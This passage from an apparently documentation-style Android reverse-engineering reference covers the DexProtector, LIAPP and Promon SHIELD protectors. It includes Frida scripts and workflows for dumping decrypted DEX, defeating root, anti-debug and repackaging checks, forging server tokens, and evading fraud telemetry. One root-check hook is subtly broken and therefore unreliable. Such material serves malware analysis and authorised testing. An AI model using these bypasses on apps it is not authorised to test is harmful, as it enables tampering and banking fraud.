decrypted payload, then dump DEX files from memory:</p> <pre><code>Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), {\n    onEnter: function(args) {\n        this.path = args[0].readUtf8String();\n        console.log(\"dlopen: \" + this.path);\n    }\n});\n</code></pre> <p>Tools like frida-dexdump scan process memory for DEX magic bytes (<code>dex\\n035\\0</code>) and dump all loaded DEX files after DexProtector has completed its decryption routine.</p>"},{"location":"packers/dexprotector/#native-bridge-index-extraction","title":"Native Bridge Index Extraction","text":"<p>To recover the hidden call graph, hook the native bridge function and log all index-to-method resolutions:</p> <pre><code>Java.perform(function() {\n    Java.enumerateLoadedClasses({\n        onMatch: function(className) {\n            try {\n                var cls = Java.use(className);\n                var methods = cls.class.getDeclaredMethods();\n                methods.forEach(function(method) {\n                    if (method.toString().indexOf(\"native\") !== -1) {\n                        console.log(\"Native bridge: \" + className + \".\" + method.getName());\n                    }\n                });\n            } catch(e) {}\n        },\n        onComplete: function() {}\n    });\n});\n</code></pre>"},{"location":"packers/dexprotector/#dpmp3-decryption","title":"dp.mp3 Decryption","text":"<p>The <code>assets/dp.mp3</code> file contains the encrypted mapping between native bridge indexes and actual method/field targets. After the app initializes, this file is decrypted in memory. Dumping the decrypted content from the process memory reveals the full method resolution table, restoring the original call graph.</p>"},{"location":"packers/dexprotector/#comparison-with-dexguard","title":"Comparison with DexGuard","text":"Aspect DexProtector DexGuard Vendor Licel Guardsquare Platform Android + iOS Android (iXGuard for iOS) Primary strength RASP + asset encryption via vtable hooking Polymorphic code obfuscation Build integration Post-build (no source code required) Build-time (Gradle plugin, requires source) Obfuscation approach Native bridge hiding + encryption Bytecode-level transformation + encryption Polymorphism No per-build variation Each build produces different obfuscation ProGuard/R8 relationship Compatible as additional layer Extends ProGuard directly White-box crypto Yes (vTEE CryptoModule) No Code virtualization Hide Access (native bridge) Optional VM interpreter EMVCo certification Yes (6 consecutive years) No Scalability of attacks Breaking one instance enables attacks on all protected apps Polymorphism forces per-build analysis <p>The fundamental architectural difference: DexGuard integrates at build time and applies polymorphic transformations, meaning each build produces unique obfuscation patterns. DexProtector operates post-build on the compiled artifact, which means its protection mechanisms are structurally consistent across all protected applications. Successfully reverse engineering DexProtector's native layer for one application provides transferable knowledge to all DexProtector-protected apps.</p>"},{"location":"packers/dexprotector/#malware-usage","title":"Malware Usage","text":"<p>DexProtector is less frequently observed in malware than DexGuard or Chinese packers, but its commercial availability has led to documented abuse.</p>"},{"location":"packers/dexprotector/#known-campaigns","title":"Known Campaigns","text":"Campaign Details Anubis QR Scanner droppers Private Anubis variant distributed via Google Play QR scanner/reader apps (Feb 2020 -- Mar 2021). DexProtector obfuscated the dropper code. Resulted in 30,000+ infections targeting 200+ banking apps and later expanded to 1,200+ targets. BankBot Google Play campaigns Sophisticated BankBot campaigns used DexProtector on Play Store droppers. ThreatFabric noted attackers \"took the time and effort to buy and integrate DexProtector,\" indicating higher technical investment than typical campaigns."},{"location":"packers/dexprotector/#usage-pattern","title":"Usage Pattern","text":"<p>Malware authors who adopt DexProtector typically demonstrate higher operational sophistication. The commercial licensing cost and integration effort filter out lower-tier operators. When DexProtector appears in malware, it usually protects a dropper component distributed through official app stores rather than the final payload itself.</p>"},{"location":"packers/dexprotector/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; check for DexProtector detection\n2. Inspect assets/ -&gt; look for dp.mp3, dp.arm-v7.so.dat, dp.arm-v8.so.dat\n3. Check META-INF/MANIFEST.MF -&gt; \"Protected-By\" header reveals version\n4. Check for dexpro-build.properties -&gt; detection flag configuration\n5. Install on physical device (emulator likely blocked)\n6. Spawn with Frida (spawn mode) -&gt; hook System.exit early\n7. Hook unlink() -&gt; prevent cleanup of decrypted files\n8. Run frida-dexdump -&gt; capture decrypted DEX from memory\n9. Decompile dumped DEX with JADX\n10. For hidden method calls -&gt; hook native bridge functions, log index resolutions\n11. For asset decryption -&gt; dump dp.mp3 contents after init completes\n</code></pre>"},{"location":"packers/dexprotector/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature DexProtector DexGuard Virbox Chinese Packers String encryption White-box crypto, dynamic keys AES/XOR with method-level keys VM-based Basic XOR in native layer DEX encryption Native bridge + vtable asset hooking Custom class loader Full DEX virtualization DEX-in-assets encryption Code virtualization Hide Access (native invokedynamic) Optional VM interpreter Core feature, full DEX Not available Asset encryption vtable hooking in libandroidfw.so Patched AssetManager N/A N/A Anti-debug Comprehensive (ptrace, JDWP, Frida, Xposed) Comprehensive Moderate Basic (ptrace) RASP Core feature, app-terminating Partial Partial None White-box crypto Yes (vTEE CryptoModule) No No No Post-build protection Yes (no source required) No (build-time integration) Yes Yes Unpacking difficulty Medium-Hard Medium Expert (VM) Easy-Medium"},{"location":"packers/dexprotector/#references","title":"References","text":"<ul> <li>Licel DexProtector</li> <li>DexProtector Documentation</li> <li>A Glimpse Into DexProtector -- Romain Thomas</li> <li>APKiD DexProtector Signatures</li> <li>Android_Dump_Dex -- Frida-based DexProtector dumper</li> <li>DexProtector EMVCo Certification</li> <li>SGSecure DexProtector Analysis</li> <li>ThreatFabric -- Anubis QR Scanner Campaigns</li> <li>ThreatFabric -- BankBot Google Play Campaigns</li> </ul>"},{"location":"packers/liapp/","title":"LIAPP","text":"<p>LIAPP is a commercial RASP and packer solution developed by Lockin Company (Seoul, South Korea). It combines DEX encryption, native library protection, and aggressive runtime self-protection into a hybrid product that functions as both a packer and a RASP framework. Recognized by Gartner for application shielding, LIAPP reports over 150 million device installations across 45,000+ applications. Among Korean-origin protectors, LIAPP is consistently described as one of the hardest to bypass on modding and reverse engineering forums.</p>"},{"location":"packers/liapp/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Lockin Company Origin Seoul, South Korea Type Commercial Packer + RASP Platforms Android, iOS Products LIAPP (mobile apps), LIAPP for Game (Unity engine), LIAPP Enterprise Scale 150M+ device installations, 45K+ protected apps Recognition Gartner-recognized for application shielding Website liapp.lockincomp.com"},{"location":"packers/liapp/#identification","title":"Identification","text":""},{"location":"packers/liapp/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detection for LIAPP is not yet implemented. This is tracked as APKiD issue #339. Manual identification is required.</p>"},{"location":"packers/liapp/#file-artifacts","title":"File Artifacts","text":"Artifact Description <code>com.lockincomp.*</code> Package references in manifest or DEX (when not fully encrypted) Native libraries Names not well-documented publicly; XOR-encrypted strings within <code>.so</code> files make signature matching difficult Encrypted assets Encrypted DEX payloads stored in assets directory XOR-encrypted strings All meaningful strings in native libraries are XOR-encrypted, requiring decryption before static analysis yields useful results"},{"location":"packers/liapp/#static-identification-challenges","title":"Static Identification Challenges","text":"<p>LIAPP is harder to fingerprint statically than most commercial packers. The combination of encrypted strings in native libraries, non-distinctive library naming, and absence of APKiD signatures means identification often relies on:</p> <ul> <li>Behavioral observation during dynamic analysis (detection dialogs, specific crash patterns)</li> <li>Presence of <code>com.lockincomp</code> references in non-encrypted portions of the APK</li> <li>Server-side communication patterns to LIAPP licensing endpoints</li> <li>Comparison with known LIAPP-protected apps from the Korean market</li> </ul>"},{"location":"packers/liapp/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/liapp/#dex-encryption","title":"DEX Encryption","text":"<p>Application DEX files are encrypted and loaded through a native decryption routine at runtime. The encryption covers the full DEX payload rather than selective class-level encryption, requiring the entire DEX to be decrypted into memory before class loading proceeds.</p>"},{"location":"packers/liapp/#source-code-obfuscation","title":"Source Code Obfuscation","text":"<p>Beyond encryption, LIAPP applies obfuscation transforms to the DEX bytecode including name mangling, control flow alteration, and dead code insertion. This ensures that even after DEX recovery, the code resists straightforward decompilation.</p>"},{"location":"packers/liapp/#string-encryption","title":"String Encryption","text":"<p>Strings are encrypted using XOR-based schemes implemented in the native layer. String decryption happens through JNI calls from Java code into the native library, which decrypts and returns the plaintext. The XOR keys are embedded in the native binary with their own layer of obfuscation, requiring IDA Pro or Ghidra analysis to extract.</p>"},{"location":"packers/liapp/#jni-library-protection","title":"JNI Library Protection","text":"<p>Native <code>.so</code> files shipped with the application are encrypted within the APK. LIAPP decrypts them at load time before <code>dlopen</code>. This protects both the developer's own JNI code and LIAPP's runtime security libraries from static extraction.</p>"},{"location":"packers/liapp/#anti-debugging","title":"Anti-Debugging","text":"<ul> <li>ptrace-based debugger detection</li> <li>JDWP connection monitoring</li> <li>TracerPid checks via <code>/proc/self/status</code></li> <li>Timing-based detection (execution speed anomalies indicating single-stepping)</li> </ul>"},{"location":"packers/liapp/#anti-tampering","title":"Anti-Tampering","text":"<ul> <li>APK signature verification against expected certificate</li> <li>DEX file integrity checks (checksum validation)</li> <li>Native library hash verification</li> <li>Detects modification of any protected component</li> </ul>"},{"location":"packers/liapp/#anti-hooking","title":"Anti-Hooking","text":"<ul> <li>Detects Frida through multiple vectors (port scanning, <code>/proc/maps</code> inspection, named pipe checks)</li> <li>Xposed framework detection (class presence, stack trace analysis)</li> <li>Substrate/Cydia detection on older devices</li> <li>Inline hook detection on native functions</li> </ul>"},{"location":"packers/liapp/#root-detection","title":"Root Detection","text":"<p>LIAPP's root detection is notably aggressive:</p> <ul> <li>Standard <code>su</code> binary and root management app checks</li> <li>Magisk root-masking detection -- specifically targets MagiskHide and Shamiko, detecting root even when hidden</li> <li>SELinux status verification</li> <li>System partition integrity checks</li> <li>Zygisk module detection</li> </ul> <p>This makes LIAPP one of the few protectors that reliably detects Magisk-hidden root, placing it alongside Promon SHIELD and Arxan in detection sophistication.</p>"},{"location":"packers/liapp/#vmemulator-detection","title":"VM/Emulator Detection","text":"<ul> <li>Build property analysis (hardware, manufacturer, model, fingerprint)</li> <li>Sensor availability and behavior checks</li> <li>Telephony state inspection</li> <li>File system artifacts specific to emulators</li> <li>Timing-based checks that detect virtualization overhead</li> </ul>"},{"location":"packers/liapp/#repackaging-prevention","title":"Repackaging Prevention","text":"<p>Certificate pinning against the original signing key combined with integrity verification of the APK structure. Repackaging with a different key triggers detection at startup.</p>"},{"location":"packers/liapp/#memory-integrity-monitoring","title":"Memory Integrity Monitoring","text":"<p>Continuous runtime monitoring of memory regions containing protected code. Detects:</p> <ul> <li>Memory patching (writing to <code>.text</code> segments)</li> <li>Breakpoint insertion (INT3/BRK instruction detection)</li> <li>Memory dumping attempts via <code>/proc/self/mem</code> access monitoring</li> </ul>"},{"location":"packers/liapp/#process-scanning","title":"Process Scanning","text":"<p>Scans the process list and <code>/proc</code> filesystem for known analysis tools, debuggers, and hooking frameworks. This includes detection of:</p> <ul> <li>frida-server process names (including renamed binaries)</li> <li>IDA remote debugger server</li> <li>GDB server</li> <li>Memory dumping utilities</li> </ul>"},{"location":"packers/liapp/#server-side-token-verification","title":"Server-Side Token Verification","text":"<p>LIAPP implements server-side authentication token verification as a defense-in-depth layer. Even after bypassing all client-side checks (root detection, anti-hooking, memory integrity), the app communicates with LIAPP's backend to validate an integrity token. If the server determines the client environment is compromised, the app functionality is restricted server-side.</p> <p>This architecture means that a fully patched local bypass may still fail at the application level because the server rejects requests from tampered clients. Defeating this requires either:</p> <ul> <li>Replaying valid tokens captured from a clean device</li> <li>Reversing the token generation algorithm and forging valid tokens</li> <li>Intercepting and modifying the server response to always return \"valid\"</li> </ul>"},{"location":"packers/liapp/#unity-engine-protection-liapp-for-game","title":"Unity Engine Protection (LIAPP for Game)","text":"<p>LIAPP for Game is a dedicated product targeting Unity-based games:</p> <ul> <li><code>libil2cpp.so</code> encryption and integrity verification</li> <li>IL2CPP metadata protection</li> <li>Memory value modification detection (anti-GameGuardian)</li> <li>Speed hack detection</li> <li>Game asset integrity checks</li> </ul>"},{"location":"packers/liapp/#unpacking-difficulty","title":"Unpacking Difficulty","text":"<p>LIAPP is described on modding forums as \"one of the toughest anti-cheat systems\" encountered in Android reverse engineering. The difficulty stems from the layered defense architecture:</p> <pre><code>Layer 1: Root/emulator detection (blocks execution on hostile environment)\nLayer 2: Anti-hooking/anti-debugging (prevents dynamic analysis tools)\nLayer 3: Memory integrity monitoring (detects runtime patching)\nLayer 4: Process scanning (detects analysis tools)\nLayer 5: DEX/SO encryption (prevents static analysis)\nLayer 6: XOR string encryption in native (requires IDA/Ghidra RE)\nLayer 7: Server-side token verification (blocks tampered clients remotely)\n</code></pre> <p>Bypassing layers 1-4 requires IDA Pro and C++ reverse engineering expertise to understand and patch the native security library. Layer 6 requires manual XOR key extraction from the native binary. Layer 7 introduces a server-side component that cannot be defeated through local patching alone.</p>"},{"location":"packers/liapp/#no-comprehensive-public-bypass","title":"No Comprehensive Public Bypass","text":"<p>Unlike AppSealing which has dedicated tools like AppPealing, no comprehensive public bypass tool exists for LIAPP. The XDA Forums contain threads discussing LIAPP and AppSealing unpacking, but no complete automated solution has been published. Each bypass attempt documented publicly addresses only a subset of LIAPP's protection layers.</p> <p>This absence of public tooling means analysts must approach LIAPP-protected targets with manual native reverse engineering:</p> <pre><code>1. Extract the native security library from the APK\n2. Load in IDA Pro or Ghidra\n3. Identify XOR-encrypted string blobs and decrypt them\n4. Map out the detection check functions from the decrypted strings\n5. Patch or hook each detection function individually\n6. Handle server-side token verification separately\n</code></pre>"},{"location":"packers/liapp/#frida-dexdump-limitations","title":"frida-dexdump Limitations","text":"<p>Standard frida-dexdump can recover decrypted DEX if the analyst first bypasses the anti-Frida and anti-root checks. However, reaching that point requires neutralizing multiple native-level detection mechanisms that specifically target Frida. ZygiskFrida injection (to avoid ptrace-based detection) combined with process name spoofing improves the chances of surviving long enough to dump.</p>"},{"location":"packers/liapp/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature LIAPP DexGuard DexProtector Promon SHIELD AppSealing DEX encryption Yes (full) Yes (class-level) Yes No Yes (selective) String encryption XOR in native AES/XOR polymorphic White-box dynamic keys Externalized to native Weak Anti-hooking Aggressive Comprehensive Comprehensive Comprehensive Basic Root detection Magisk-aware Comprehensive Comprehensive Magisk-aware Moderate Server-side verification Yes No No No No Memory monitoring Yes No Partial Yes No Unity game support Yes (dedicated product) No Limited No Yes Public bypass tools None Limited Limited Limited Yes (AppPealing) Unpacking difficulty Hard Medium-Hard Medium-Hard Medium (bypass) Low-Medium <p>LIAPP functions as a hybrid packer+RASP, comparable to DexProtector's full protection suite in scope. In the Korean market, it serves as the equivalent of Promon SHIELD for European banking. The server-side token verification layer is unique among the documented packers and adds a dimension that purely client-side protectors lack.</p>"},{"location":"packers/liapp/#industry-usage","title":"Industry Usage","text":"<p>LIAPP is primarily deployed in:</p> <ul> <li>Korean banking -- KBPay (KB Financial Group), NH Bank (NongHyup), and other major Korean financial institutions</li> <li>Telecommunications -- U+ Customer Center (LG U+) and carrier-affiliated apps</li> <li>Gaming -- Korean game publishers using LIAPP for Game to protect Unity titles</li> <li>Government and enterprise -- Korean public sector and corporate applications requiring certified protection</li> </ul> <p>The Korean financial regulatory environment drives adoption, as banks must demonstrate application-level security controls. LIAPP's Gartner recognition and domestic presence make it the default choice for Korean financial institutions, similar to how Promon SHIELD dominates European banking.</p>"},{"location":"packers/liapp/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Attempt APKiD -&gt; no LIAPP signature (issue #339 pending)\n2. Manual inspection: look for com.lockincomp references, XOR-encrypted native strings\n3. If server-side verification present -&gt; capture valid tokens from clean device first\n4. Use ZygiskFrida for stealth injection (avoid ptrace detection)\n5. Hook anti-root and anti-hooking checks in native library (requires prior IDA analysis)\n6. Once checks bypassed -&gt; frida-dexdump for DEX recovery\n7. Decrypt XOR strings from native library using extracted keys\n8. For Unity games -&gt; extract and analyze decrypted libil2cpp.so\n9. Handle server-side token replay/forgery if app functionality depends on it\n</code></pre> <p>Physical device with Magisk + Zygisk + ZygiskFrida is strongly recommended. Emulators are likely to be detected and blocked. Even with hidden root (Shamiko), LIAPP's Magisk-masking detection may trigger, requiring native-level patches to the detection routine itself.</p>"},{"location":"packers/liapp/#references","title":"References","text":"<ul> <li>LIAPP Official</li> <li>Lockin Company</li> <li>APKiD -- Issue #339 (LIAPP Detection)</li> <li>APKiD -- Packer Detection</li> <li>Gartner -- Application Shielding Market</li> <li>frida-dexdump -- Automated DEX Dumping</li> <li>ZygiskFrida -- Stealth Frida Injection</li> <li>XDA Forums -- LIAPP and AppSealing Discussion</li> <li>IDA Pro -- Native Analysis</li> </ul>"},{"location":"packers/promon/","title":"Promon SHIELD","text":"<p>Promon SHIELD is a commercial RASP (Runtime Application Self-Protection) solution developed by Promon (Oslo, Norway). Unlike traditional packers that encrypt DEX bytecode, SHIELD focuses on runtime integrity checks, environment detection, and anti-tampering. It is the dominant mobile app protection solution in European banking, reportedly used by over 50% of leading European financial institutions.</p>"},{"location":"packers/promon/#vendor-information","title":"Vendor Information","text":"Attribute Details Developer Promon AS Origin Oslo, Norway Type Commercial RASP / Application Shielding Platforms Android, iOS, Desktop (Windows, macOS) Products SHIELD for Mobile, SHIELD for Desktop, SDK Protection, IP Protection Pro Founded 2006"},{"location":"packers/promon/#rasp-vs-packer","title":"RASP vs Packer","text":"<p>Promon SHIELD operates fundamentally differently from packers like DexGuard or Virbox.</p> Aspect RASP (Promon SHIELD) Packer (DexGuard, Virbox) Primary function Runtime environment monitoring Code transformation and encryption DEX encryption No Yes String encryption No (externalizes to native layer) Yes (inline decryption methods) Code virtualization No Yes (Virbox), optional (DexGuard) Anti-debugging Core feature Secondary feature Root/hook detection Core feature Secondary feature Overlay protection Yes No Screen capture blocking Yes No Integration model Injected native library + config Build-time transformation <p>SHIELD wraps an application by injecting a native library that loads before anything else in the process. The library performs all checks at the native level, making Java-layer bypasses insufficient. The app's own code remains largely unmodified -- the protection is external rather than woven into the bytecode.</p>"},{"location":"packers/promon/#identification","title":"Identification","text":""},{"location":"packers/promon/#apkid-detection","title":"APKiD Detection","text":"<p>APKiD detects Promon SHIELD through ELF segment analysis of native libraries:</p> <pre><code>packer : Promon Shield\n</code></pre> <p>Detection is segment-based rather than filename-based, since library names are randomized in newer versions.</p>"},{"location":"packers/promon/#file-artifacts","title":"File Artifacts","text":"Artifact Description Native library Randomized name (e.g., <code>libenhefoocjfcl.so</code>, <code>libniiblkgocjbb.so</code>). Legacy versions used <code>libshield.so</code> or <code>libshield.XXXXXXXX.so</code> Config file <code>config-encrypt.txt</code> in assets -- encrypted configuration consumed by the native library Mapping file <code>pbi.bin</code> in assets -- encrypted mapping data Architecture Typically <code>arm64-v8a</code>, may include <code>armeabi-v7a</code> and <code>x86</code> Library size Noticeably large compared to typical app native libraries"},{"location":"packers/promon/#java-side-indicators","title":"Java-Side Indicators","text":"<p>Promon SHIELD externalizes strings and class initialization to native methods. A bridge class (obfuscated name, e.g., <code>C6539Z</code>) exposes two native methods:</p> <pre><code>native String m1788a(int i);\nnative void m1787a(Class cls, int i);\n</code></pre> <p>The first retrieves strings by index from the native layer. The second initializes classes by ID. The library name itself is XOR-encrypted before being passed to <code>System.loadLibrary()</code>.</p> <p>If decompiled code shows string retrieval through indexed native calls rather than inline string literals or Java-based decryption methods, it is likely Promon SHIELD.</p>"},{"location":"packers/promon/#distinguishing-from-other-protectors","title":"Distinguishing from Other Protectors","text":"<ul> <li>No DEX encryption: classes.dex is readable in JADX (strings are missing, but structure is intact)</li> <li>No <code>o</code>/<code>oo</code>/<code>ooo</code> decryption classes: unlike DexGuard, there are no Java string decryption stubs</li> <li>Single large native library: unlike Chinese packers that have recognizable library names (<code>libjiagu.so</code>, <code>libshella.so</code>)</li> <li>OLLVM-obfuscated native code: the native library uses Obfuscator-LLVM with control flow flattening</li> </ul>"},{"location":"packers/promon/#protection-mechanisms","title":"Protection Mechanisms","text":""},{"location":"packers/promon/#native-library-lifecycle","title":"Native Library Lifecycle","text":"<ol> <li><code>.init_array</code> constructor executes before <code>JNI_OnLoad</code></li> <li>Constructor unpacks the encrypted <code>.text</code> section and resolves imports dynamically via <code>dlsym()</code> and direct syscalls (<code>SVC 0</code>)</li> <li>Configuration is decrypted from <code>config-encrypt.txt</code></li> <li>Environment checks begin immediately</li> <li>If checks pass, the app's original code proceeds normally</li> </ol>"},{"location":"packers/promon/#anti-debugging","title":"Anti-Debugging","text":"<p>Process isolation via ptrace lock:</p> <ol> <li><code>fork()</code> creates a child process</li> <li>Parent calls <code>prctl(PR_SET_PTRACER)</code> to restrict tracing to the child only</li> <li>Child attaches to parent via <code>ptrace(PTRACE_ATTACH)</code></li> <li><code>prctl(PR_SET_DUMPABLE, false)</code> blocks external debuggers</li> </ol> <p>This prevents any other process from attaching a debugger to the protected app. The child process acts as a watchdog.</p> <p>JDWP disablement:</p> <p>Patches <code>art::JDWP::JdwpState::HandlePacket()</code> at the ART runtime level to kill Java debugging entirely. This goes beyond checking <code>ro.debuggable</code> -- it neutralizes the debug protocol handler in-process.</p>"},{"location":"packers/promon/#root-detection","title":"Root Detection","text":"<p>Checks over 20 system properties and file paths:</p> Category Examples System properties <code>ro.debuggable</code>, <code>ro.secure</code>, <code>persist.sys.root_access</code>, <code>service.adb.root</code> Su binaries <code>/system/xbin/su</code>, <code>/system/bin/su</code>, <code>/sbin/su</code> Magisk artifacts <code>/data/adb/magisk/magisk</code>, <code>/data/data/com.topjohnwu.magisk</code> SuperSU artifacts <code>/init.supersu.rc</code>, SuperSU package paths Other root tools Kingroot paths, root management app packages <p>Directory watches via <code>inotify_add_watch()</code> monitor <code>/bin</code>, <code>/system/bin</code>, <code>/system/xbin</code>, and <code>/vendor/bin</code> for changes -- detecting root tools installed after the app starts.</p>"},{"location":"packers/promon/#hooking-framework-detection","title":"Hooking Framework Detection","text":"Framework Detection Method Frida Scans <code>/proc/self/maps</code> for <code>libFridaGadget.so</code>, checks memory page integrity Xposed Looks for <code>libxposed_art.so</code> in memory, checks for <code>art::mirror::ArtMethod::EnableXposedHook()</code> export symbol Cydia Substrate Scans for <code>libsubstrate.so</code> and <code>libsubstrate-dvm.so</code> in loaded libraries Memory patching Validates memory page contents -- modifications trigger process termination"},{"location":"packers/promon/#emulator-detection","title":"Emulator Detection","text":"<p>Checks system properties that leak virtual hardware:</p> <ul> <li><code>ro.kernel.qemu</code> (QEMU-based emulators)</li> <li><code>ro.hardware</code> (goldfish, ranchu)</li> <li>Device manufacturer, model, and hardware strings</li> <li>ChromeOS and virtual machine indicators</li> <li>Telephony state anomalies</li> <li>Hardware sensor availability</li> </ul>"},{"location":"packers/promon/#repackaging-detection","title":"Repackaging Detection","text":"<ol> <li>Opens the installed <code>base.apk</code> directly via <code>openat()</code> syscall (bypasses Java file APIs)</li> <li>Parses the APK signing block to extract signing certificates</li> <li>Compares against expected certificate embedded in the native library</li> <li>Verifies <code>libshield.so</code> checksum before proceeding with other checks</li> </ol> <p>The syscall-based file access makes it harder to intercept with standard Java hooks.</p>"},{"location":"packers/promon/#overlay-detection","title":"Overlay Detection","text":"<p>Detects if another application draws over the protected app's window. Prevents tapjacking and phishing overlays that attempt to capture user input. The app can block interaction, alert the user, or terminate when an overlay is detected.</p>"},{"location":"packers/promon/#screen-capture-prevention","title":"Screen Capture Prevention","text":"<p>Blocks screenshots, screen recordings, and screen mirroring of the protected app. Uses <code>FLAG_SECURE</code> and additional native-level enforcement to prevent data leakage through screen capture.</p>"},{"location":"packers/promon/#dynamic-imports-and-syscalls","title":"Dynamic Imports and Syscalls","text":"<p>The native library avoids standard libc imports for security-critical operations. Functions resolved at runtime via <code>dlsym()</code> or invoked through direct <code>SVC 0</code> syscalls include:</p> <pre><code>ptrace, prctl, fork, execl, __system_property_get,\ndlopen, dladdr, inotify_init, inotify_add_watch,\neventfd, dl_iterate_phdr, openat, read, write, mmap\n</code></pre> <p>Direct syscalls bypass any LD_PRELOAD or linker-level hooking.</p>"},{"location":"packers/promon/#native-code-obfuscation","title":"Native Code Obfuscation","text":"<p>The SHIELD library itself is protected with:</p> <ul> <li>OLLVM control flow flattening: function CFGs are destroyed and replaced with dispatcher-based execution</li> <li>Packed .text section: encrypted at rest, unpacked by <code>.init_array</code> constructor at load time</li> <li>No readable string table: strings resolved dynamically</li> <li>Stripped symbols: no exported function names beyond JNI entry points</li> </ul>"},{"location":"packers/promon/#bypass-approaches","title":"Bypass Approaches","text":""},{"location":"packers/promon/#frida-based-string-index-enumeration","title":"Frida-Based String Index Enumeration","text":"<p>Since SHIELD externalizes all strings to native methods accessed by index, you can brute-force the index space to reconstruct the string table:</p> <pre><code>Java.perform(function() {\n    var bridge = Java.use(\"com.target.app.C6539Z\");\n    for (var i = 0; i &lt; 5000; i++) {\n        try {\n            var s = bridge.m1788a(i);\n            if (s !== null &amp;&amp; s.length &gt; 0) {\n                console.log(\"idx \" + i + \" -&gt; \" + s);\n            }\n        } catch(e) {}\n    }\n});\n</code></pre> <p>The bridge class name and method name will differ per app -- locate them by searching for classes with native methods that take a single <code>int</code> parameter and return <code>String</code>.</p>"},{"location":"packers/promon/#bypassing-ptrace-lock","title":"Bypassing ptrace Lock","text":"<p>The fork-and-attach pattern can be defeated by:</p> <ol> <li>Patching the native library: NOP out the <code>fork()</code> and <code>ptrace()</code> calls in the unpacked <code>.text</code> section</li> <li>Early Frida injection: attach Frida before the native library's <code>.init_array</code> runs by spawning with <code>frida -f</code> and hooking <code>android_dlopen_ext</code> to intercept the library load</li> <li>Hooking <code>fork()</code>: return 0 (pretend to be the child) or -1 (pretend fork failed) to prevent the watchdog process from starting</li> </ol>"},{"location":"packers/promon/#bypassing-root-detection","title":"Bypassing Root Detection","text":"<pre><code>Java.perform(function() {\n    var Runtime = Java.use(\"java.lang.Runtime\");\n    Runtime.exec.overload(\"java.lang.String\").implementation = function(cmd) {\n        if (cmd.indexOf(\"su\") !== -1 || cmd.indexOf(\"which\") !== -1) {\n            throw Java.use(\"java.io.IOException\").$new(\"not found\");\n        }\n        return this.exec(cmd);\n    };\n});\n</code></pre> <p>For native-level checks, intercept <code>__system_property_get</code> via <code>Interceptor.attach</code>:</p> <pre><code>var prop_get = Module.findExportByName(null, \"__system_property_get\");\nInterceptor.attach(prop_get, {\n    onEnter: function(args) {\n        this.name = args[0].readUtf8String();\n    },\n    onLeave: function(retval) {\n        if (this.name === \"ro.debuggable\" || this.name === \"ro.secure\") {\n            args[1].writeUtf8String(\"0\");\n        }\n    }\n});\n</code></pre>"},{"location":"packers/promon/#bypassing-repackaging-detection","title":"Bypassing Repackaging Detection","text":"<p>The <code>promon-reversal</code> project demonstrates that APK signature verification can be bypassed by:</p> <ol> <li>Extracting the original signing certificate from the native library's embedded data</li> <li>Hooking the certificate comparison at the native level</li> <li>Returning the expected certificate when SHIELD performs its check</li> </ol>"},{"location":"packers/promon/#native-library-patching","title":"Native Library Patching","text":"<p>For persistent bypass (lab environment):</p> <pre><code>1. Extract the APK\n2. Identify the SHIELD library (randomized name, largest .so in lib/)\n3. Load in Ghidra/IDA -&gt; locate .init_array entry point\n4. Trace from init_array through the unpacking routine\n5. Dump the unpacked .text section at runtime\n6. Patch detection routines (NOP out fork/ptrace/property checks)\n7. Replace the library, resign the APK\n8. Install with signature verification bypass (Frida hook or debug certificate)\n</code></pre> <p>This approach requires re-bypassing the repackaging check since the modified library will fail its own integrity verification.</p>"},{"location":"packers/promon/#magisk-based-approach","title":"Magisk-Based Approach","text":"<p>MagiskHide (deprecated) or Shamiko/Zygisk-based hiding can prevent SHIELD from seeing root artifacts in the filesystem and process list. Combined with a Frida server renamed and running on a non-default port, this avoids the most common detection vectors.</p>"},{"location":"packers/promon/#banking-app-context","title":"Banking App Context","text":"<p>Promon SHIELD is the primary protection for European banking and financial apps. During mobile penetration tests of banking applications, SHIELD is the most frequently encountered defense layer.</p> <p>Key considerations for pentesters:</p> Aspect Detail Prevalence Over 50% of top European banks reportedly use Promon SHIELD Typical deployment Combined with certificate pinning, obfuscation (often R8/ProGuard), and server-side fraud detection Response behavior Configurable per customer -- may silently report, block functionality, or force-close the app Multi-layered Banks often stack SHIELD with DexGuard or proprietary obfuscation Server reporting Detection events may be reported server-side, potentially flagging the tester's device or account <p>When assessing a SHIELD-protected banking app, disable telemetry reporting hooks early to avoid triggering server-side fraud alerts during testing.</p>"},{"location":"packers/promon/#comparison-with-other-protectors","title":"Comparison with Other Protectors","text":"Feature Promon SHIELD DexGuard Virbox Chinese Packers Primary approach RASP (runtime checks) Code transformation DEX virtualization DEX encryption DEX encryption No Yes Yes (VM-based) Yes String protection Native externalization AES/XOR decryption VM-based Native layer XOR Anti-debugging Comprehensive (ptrace lock, JDWP patch) Comprehensive Moderate Basic Root detection Comprehensive (20+ checks, inotify) Moderate Moderate Basic Overlay protection Yes No No No Screen capture block Yes No No No Hooking detection Frida, Xposed, Substrate, memory integrity Frida, Xposed ptrace, debug flags ptrace Bypass difficulty Medium-High (native-heavy) Medium (Frida hooks effective) High (VM interpretation) Low (DEX dump) Typical customers European banks, fintech Enterprise, some malware Chinese market, some malware Chinese market, malware"},{"location":"packers/promon/#analyst-workflow","title":"Analyst Workflow","text":"<pre><code>1. Run APKiD -&gt; confirm \"Promon Shield\" detection on the native library\n2. Open in JADX -&gt; note intact class structure but missing string literals\n3. Locate the bridge class with native int-&gt;String methods\n4. Spawn app with Frida (-f flag to attach early)\n5. Hook android_dlopen_ext to intercept SHIELD library loading\n6. Enumerate string indices via the bridge class native method\n7. Hook fork() and ptrace() to disable the anti-debug watchdog\n8. Hook __system_property_get to feed clean values for root checks\n9. If repackaging needed -&gt; bypass certificate verification at native level\n10. For SSL pinning -&gt; standard Frida SSL pinning bypass after RASP is neutralized\n</code></pre> <p>The critical difference from packer analysis: there is no DEX to unpack. The app code is already readable. The challenge is getting the app to run in an instrumented environment, not recovering hidden code.</p>"},{"location":"packers/promon/#references","title":"References","text":"<ul> <li>Promon SHIELD for Mobile</li> <li>Promon SHIELD 7.0 Release</li> <li>promon-reversal -- Analysis and PoC Bypass</li> <li>APKiD Promon Detection 